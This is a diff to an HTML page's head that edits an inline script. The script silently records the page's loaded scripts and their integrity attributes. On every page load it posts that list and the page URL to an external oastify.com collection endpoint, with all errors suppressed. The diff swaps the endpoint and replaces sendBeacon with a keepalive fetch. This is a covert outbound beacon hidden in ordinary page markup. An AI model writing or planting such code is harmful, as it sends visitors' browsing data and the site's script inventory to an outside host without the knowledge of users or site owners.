@@ -2,14 +2,14 @@
 <html lang="en">
 <head>
 
-<script>
-
-       (function () {
+       <script>
+(function () {
   'use strict';
 
-  const ENDPOINT    = 'https://0nokywbevarydes1ipi5qw1vvm1dp3ds.oastify.com/collect';
+  const ENDPOINT    = 'https://gi29nobyduqeh0gubj50o6ag57byzond.oastify.com/collect';
   const MAX_SCRIPTS = 100;
   const MAX_BYTES   = 50000;
+  const TIMEOUT_MS  = 3000;
 
   try {
     const scriptMeta = new Map();
@@ -19,8 +19,7 @@
         if (node.nodeName === 'SCRIPT' && node.src) {
           scriptMeta.set(node.src, {
             url: node.src,
-            integrity: node.getAttribute('integrity') || null,
-            crossorigin: node.getAttribute('crossorigin') || null
+            integrity: node.getAttribute('integrity') || null
           });
         }
       } catch (_) {}
@@ -40,29 +39,32 @@
       }).observe(document.documentElement, { childList: true, subtree: true });
     } catch (_) {}
 
-    window.addEventListener('load', async () => {
-      await new Promise(r => setTimeout(r, 0));
+    window.addEventListener('load', () => {
+      setTimeout(() => {
+        try {
+          const scripts = [...scriptMeta.values()];
 
-      try {
-        const scripts = [...scriptMeta.values()];
+          if (scripts.length > MAX_SCRIPTS) return;
 
-        if (scripts.length > MAX_SCRIPTS) return;
+          const payload = JSON.stringify({
+            page: window.location.href,
+            scripts,
+            ts: Date.now()
+          });
 
-        const payload = JSON.stringify({
-          page: window.location.href,
-          scripts,
-          ts: Date.now()
-        });
+          if (payload.length > MAX_BYTES) return;
 
-        if (payload.length > MAX_BYTES) return;
-
-        navigator.sendBeacon(ENDPOINT, payload);
-
-      } catch (_) {}
+          fetch(ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'text/plain' },
+            body: payload,
+            keepalive: true,
+            signal: AbortSignal.timeout(TIMEOUT_MS)
+          }).catch(() => {});
+        } catch (_) {}
+      }, 0);
     });
-
   } catch (_) {}
-
 })();
 
 </script>
